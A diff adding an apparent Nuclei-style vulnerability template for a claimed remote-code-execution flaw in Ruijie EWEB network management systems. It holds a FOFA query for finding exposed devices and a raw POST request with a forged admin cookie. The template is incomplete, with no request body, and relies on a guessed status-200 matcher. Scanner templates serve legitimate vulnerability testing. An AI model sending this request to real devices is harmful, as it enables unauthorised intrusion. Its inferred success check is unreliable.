@@ -1,0 +1,55 @@
+id: poc-urc0tcm1cfpg00nd
+info:
+  name: Ruijie-EWEB网管系统 rce
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/urc0tcm1cfpg00nd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: urc0tcm1cfpg00nd
+    fofa: title="锐捷网络-EWEB网管系统"
+http:
+- raw:
+  - 'POST /flow_control_pi/flwo.control.php?a=flowOpen HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+    Content-Length: 11
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: user=21232f297a57a5a743894a0e4a801fc3; LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gateway; supportMoreLan=no; RUIJIEID=h250c4c46emk9dv2mjmbk5rlc0; user=21232f297a57a5a743894a0e4a801fc3; isRedirect=true; authenType=local; accountType=write; showPatchDialog=true; module=macc; threeModule=seltab
+
+    Origin: https:// localhost:4430
+
+    Referer: https:// localhost:4430/rac_pi/surfilter_selservice.htm
+
+    Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+    X-Forwarded-For: x
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
